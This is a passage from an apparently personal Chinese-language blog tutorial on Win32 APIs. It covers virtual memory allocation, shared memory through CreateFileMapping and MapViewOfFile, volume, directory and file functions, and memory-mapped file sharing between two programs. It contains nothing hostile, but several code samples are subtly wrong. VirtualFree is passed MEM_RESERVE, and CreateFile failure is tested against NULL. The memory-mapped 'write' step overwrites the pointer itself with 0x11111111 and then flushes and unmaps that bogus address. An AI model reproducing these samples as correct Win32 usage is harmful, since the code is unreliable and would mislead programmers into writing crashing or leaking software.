class="code"><pre><span class="line"><span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_READWRITE);<span class="comment">// 虚拟地址仍然保留，物理页不保留</span></span><br></pre></td></tr></table></figure><p>想要释放物理内存，释放线性地址就写如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualFree</span>(p, <span class="number">0</span>, MEM_RESERVE);<span class="comment">// 虚拟地址不保留</span></span><br></pre></td></tr></table></figure><h1 id="共享内存的申请释放"><a href="#共享内存的申请释放" class="headerlink" title="共享内存的申请释放"></a>共享内存的申请释放</h1><h2 id="CreateFileMapping"><a href="#CreateFileMapping" class="headerlink" title="CreateFileMapping"></a>CreateFileMapping</h2><p>内核对象，这个对象可以为我们准备物理内存，还可以将文件映射到物理页</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hFile,                       <span class="comment">// handle to file 文件句柄，如果不想将文件映射到物理页，则不指定该参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">// security 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect,                    <span class="comment">// protection 保护模式，物理页的属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMaximumSizeHigh,            <span class="comment">// high-order DWORD of size 高32位，在32位计算机里通常设置为空</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMaximumSizeLow,             <span class="comment">// low-order DWORD of size 低32位，指定物理内存的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                      <span class="comment">// object name 对象名字，公用时写，自己使用则可以不指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>创建好物理页后，还需要通过<strong>MapViewOffile函数</strong>将物理页与线性地址进行映射：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">MapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hFileMappingObject,   <span class="comment">// handle to file-mapping object file-mapping对象的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,       <span class="comment">// access mode 访问模式(虚拟内存的限制必须比物理地址更加严格)</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFileOffsetHigh,      <span class="comment">// high-order DWORD of offset 高32位，在32位计算机里通常设置为空</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFileOffsetLow,       <span class="comment">// low-order DWORD of offset 低32位，指定从哪里开始映射</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwNumberOfBytesToMap  <span class="comment">// number of bytes to map 共享内存的大小，一般与物理页大小一致</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>示例代码，也可以双开一个，直接读</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MapFileName <span class="meta-string">&quot;共享内存&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 0x1000</span></span><br><span class="line">HANDLE g_hMapFile;</span><br><span class="line">LPTSTR g_lpBuff;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 内核对象：准备好物理页，无效句柄值-1、物理页可读写、申请一个物理页</span></span><br><span class="line">    g_hMapFile = <span class="built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, BUF_SIZE, (LPCWSTR)MapFileName);</span><br><span class="line">    <span class="comment">// 将物理页与线性地址进行映射</span></span><br><span class="line"></span><br><span class="line">    g_lpBuff = (LPTSTR)<span class="built_in">MapViewOfFile</span>(g_hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向物理内存中存储</span></span><br><span class="line">    *(PDWORD)g_lpBuff = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭映射，关闭映射则表示释放了线形地址，但是物理页还存在</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(g_lpBuff);</span><br><span class="line">    <span class="comment">// 关闭句柄，这样才能释放物理页，但需要等待物理页使用完毕才会真正的释放，这里只是告诉系统我们当前进程不再使用该句柄（物理页）</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(g_hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件系统-未完成，文件操作相关API未写"><a href="#文件系统-未完成，文件操作相关API未写" class="headerlink" title="文件系统(未完成，文件操作相关API未写)"></a>文件系统(未完成，文件操作相关API未写)</h1><p>文件系统是操作系统用于管理磁盘上文件的方法和数据结构；简单点说就是在磁盘上如何组织文件的<strong>方法</strong>。</p><p>文件系统是软件层面的。</p><table><thead><tr><th></th><th>NTFS</th><th>FAT32</th></tr></thead><tbody><tr><td>磁盘分区容量</td><td>2T</td><td>32G</td></tr><tr><td>单个文件容量</td><td>4G以上</td><td>最大4G</td></tr><tr><td>EFS加密</td><td>支持</td><td>不支持</td></tr><tr><td>磁盘配额</td><td>支持</td><td>不支持</td></tr></tbody></table><h2 id="卷相关API"><a href="#卷相关API" class="headerlink" title="卷相关API"></a>卷相关API</h2><h3 id="获取卷（逻辑驱动器）"><a href="#获取卷（逻辑驱动器）" class="headerlink" title="获取卷（逻辑驱动器）"></a>获取卷（逻辑驱动器）</h3><p>函数<strong>GetLogicalDrives</strong>用于获取当前计算机所有逻辑驱动器，语法格式为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDrives</span><span class="params">(VOID)</span></span>; <span class="comment">// 返回值是一个DOWRD，没有参数</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD gLd = <span class="built_in">GetLogicalDrives</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetLogicalDrives: %x\n&quot;</span>, gLd);</span><br></pre></td></tr></table></figure><h3 id="获取所有逻辑驱动器的字符串"><a href="#获取所有逻辑驱动器的字符串" class="headerlink" title="获取所有逻辑驱动器的字符串"></a>获取所有逻辑驱动器的字符串</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDriveStrings</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nBufferLength,  <span class="comment">// size of buffer 输入类型，要获取字符串的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpBuffer       <span class="comment">// drive strings buffer 输出类型，将获取的字符串放到该参数中</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404184443807.png" alt="image-20220404184443807"></p><h3 id="获取卷（逻辑驱动器）的类型"><a href="#获取卷（逻辑驱动器）的类型" class="headerlink" title="获取卷（逻辑驱动器）的类型"></a>获取卷（逻辑驱动器）的类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetDriveType</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpRootPathName   <span class="comment">// root directory 根目录，这里我们可以使用驱动器字符串</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取卷信息"><a href="#获取卷信息" class="headerlink" title="获取卷信息"></a>获取卷信息</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVolumeInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpRootPathName,           <span class="comment">// root directory 输入类型，驱动器字符串</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpVolumeNameBuffer,        <span class="comment">// volume name buffer 输出类型，返回卷名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nVolumeNameSize,            <span class="comment">// length of name buffer 输入类型，卷名长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpVolumeSerialNumber,     <span class="comment">// volume serial number 输出类型，卷宗序列号</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpMaximumComponentLength, <span class="comment">// maximum file name length 输出类型，指定文件系统支持的文件名组件的最大长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpFileSystemFlags,        <span class="comment">// file system options 输出类型，与指定文件系统相关的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpFileSystemNameBuffer,    <span class="comment">// file system name buffer 输出类型，文件系统（如FAT或NTFS）名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nFileSystemNameSize         <span class="comment">// length of file system name buffer 输入类型，文件系统名称的长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404222404635.png" alt="image-20220404222404635"></p><h2 id="目录相关API"><a href="#目录相关API" class="headerlink" title="目录相关API"></a>目录相关API</h2><h2 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h2><p>CreateDirectory</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName,                         <span class="comment">// directory name 目录名称，需要指定完整路径包含盘符的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateDirectory</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;E:\\A&quot;</span>), <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RemoveDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName   <span class="comment">// directory name 目录名称，需要指定完整路径包含盘符的</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="修改目录名称"><a href="#修改目录名称" class="headerlink" title="修改目录名称"></a>修改目录名称</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MoveFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpExistingFileName, <span class="comment">// file name 目录名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpNewFileName       <span class="comment">// new file name 新目录名</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取程序当前目录"><a href="#获取程序当前目录" class="headerlink" title="获取程序当前目录"></a>获取程序当前目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetCurrentDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nBufferLength,  <span class="comment">// size of directory buffer 输入类型，获取当前目录名的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpBuffer       <span class="comment">// directory buffer 输出类型，当前目录名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="设置程序当前目录"><a href="#设置程序当前目录" class="headerlink" title="设置程序当前目录"></a>设置程序当前目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetCurrentDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName   <span class="comment">// new directory name 新的目录名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="文件相关API"><a href="#文件相关API" class="headerlink" title="文件相关API"></a>文件相关API</h2><h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpFileName,                         <span class="comment">// file name 文件名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,                      <span class="comment">// access mode 访问模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwShareMode,                          <span class="comment">// share mode 共享模式，如果为0则是排他性，就是目前在使用时其他人是无法使用的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationDisposition,                <span class="comment">// how to create 如何创建，可以打开一个已经存在的文件</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFlagsAndAttributes,                 <span class="comment">// file attributes 文件属性，可以创建隐藏文件</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hTemplateFile                        <span class="comment">// handle to template file </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>以可读可写方式不管有没有，有就覆盖没有就新建的方式创建一个隐藏文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateFile</span>(</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;E:\\A.txt&quot;</span>),</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,<span class="comment">//访问模式</span></span><br><span class="line">        <span class="number">0</span>,                     <span class="comment">//共享模式，如果为0则是排他性，就是目前在使用时其他人是无法使用的</span></span><br><span class="line">        <span class="literal">NULL</span>,                  <span class="comment">// SD</span></span><br><span class="line">        CREATE_ALWAYS,         <span class="comment">//如何创建，可以打开一个已经存在的文件</span></span><br><span class="line">        FILE_ATTRIBUTE_HIDDEN, <span class="comment">//文件属性，可以创建隐藏文件</span></span><br><span class="line">        <span class="literal">NULL</span>                   <span class="comment">//创建文件的句柄</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><p>未完成………………待续…………..</p><h1 id="内存映射文件"><a href="#内存映射文件" class="headerlink" title="内存映射文件"></a>内存映射文件</h1><p>内存映射文件，将硬盘某个文件映射到<strong>物理页</strong>上，然后再将物理页映射到<strong>虚拟内存</strong>中。</p><h2 id="内存映射文件读写"><a href="#内存映射文件读写" class="headerlink" title="内存映射文件读写"></a>内存映射文件读写</h2><ol><li> 创建文件</li><li> 创建FileMapping对象</li><li>  物理页映射到虚拟内存</li><li> 之后就是读写文件了</li><li> 关闭资源</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 创建文件（获取文件句柄）</span></span><br><span class="line">    hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;E:\\1.txt&quot;</span>), </span><br><span class="line">        GENERIC_READ | GENERIC_WRITE, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        OPEN_EXISTING, </span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, </span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断CreateFile是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 创建FileMapping对象</span></span><br><span class="line">    hMapFile = <span class="built_in">CreateFileMapping</span>(</span><br><span class="line">        hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断CreateFileMapping是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hMapFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileMapping failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_COPY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 读取文件</span></span><br><span class="line">    DWORD dwTest1 = *(LPDWORD)lpAddr; <span class="comment">// 读取最开始的4字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwTest1: %x \n&quot;</span>, dwTest1);</span><br><span class="line">    <span class="comment">// 5. 写文件 </span></span><br><span class="line">     lpAddr = (LPVOID)<span class="number">0x11111111</span>;</span><br><span class="line">   <span class="comment">// 如果你希望修改可以立即生效，我们可以通过FlushViewOfFile函数来强制更新缓存</span></span><br><span class="line">     <span class="built_in">FlushViewOfFile</span>(((LPDWORD)lpAddr), <span class="number">8</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存映射文件之共享"><a href="#内存映射文件之共享" class="headerlink" title="内存映射文件之共享"></a>内存映射文件之共享</h2><p>实现如下的情况</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404232317050.png" alt="image-20220404232317050"></p><p>A程序写入，B程序读取：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAPPINGNAME <span class="meta-string">&quot;Share File&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD <span class="title">MappingFile</span><span class="params">(LPSTR lpcFile)</span> </span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. 创建文件（获取文件句柄）</span></span><br><span class="line">    hFile = <span class="built_in">CreateFile</span>(lpcFile, GENERIC_READ|GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断CreateFile是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span>(hFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 创建FileMapping对象</span></span><br><span class="line">    hMapFile = <span class="built_in">CreateFileMapping</span>(hFile, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0</span>, MAPPINGNAME);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 判断CreateFileMapping是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span>(hMapFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileMapping failed: %d \n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 3. 物理页映射到虚拟内存</span></span><br><span class="line">    lpAddr = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 4. 读取文件</span></span><br><span class="line">    <span class="comment">// DWORD dwTest1 = *(LPDWORD)lpAddr; // 读取最开始的4字节</span></span><br><span class="line">    <span class="comment">// printf(&quot;dwTest1: %x \n&quot;, dwTest1);</span></span><br><span class="line">    <span class="comment">// 5. 写文件</span></span><br><span class="line">    *(LPDWORD)lpAddr = <span class="number">0x41414142</span>;</span><br><span class="line">    <span class="built_in">FlushViewOfFile</span>(((LPDWORD)lpAddr), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process A Write&quot;</span>);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="comment">// 6. 关闭资源</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(lpAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B程序：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAPPINGNAME <span class="meta-string">&quot;Share File&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">DWORD <span class="title">MappingFile</span><span class="params">(LPSTR lpcFile)</span> </span>&#123;</span><br><span class="line">    HANDLE hMapFile;</span><br><span class="line">    LPVOID lpAddr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. 打开FileMapping对象</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    OpenFileMapping 函数语法格式：</span></span><br><span class="line"><span class="comment">    HANDLE OpenFileMapping(</span></span><br><span class="line"><span class="comment">        DWORD dwDesiredAccess,  // access mode 访问模式</span></span><br><span class="line"><span class="comment">        BOOL bInheritHandle,    // inherit flag 继承标识，为真则表示这个可以被新进程继承，为假反之</span></span><br><span class="line"><span class="comment">        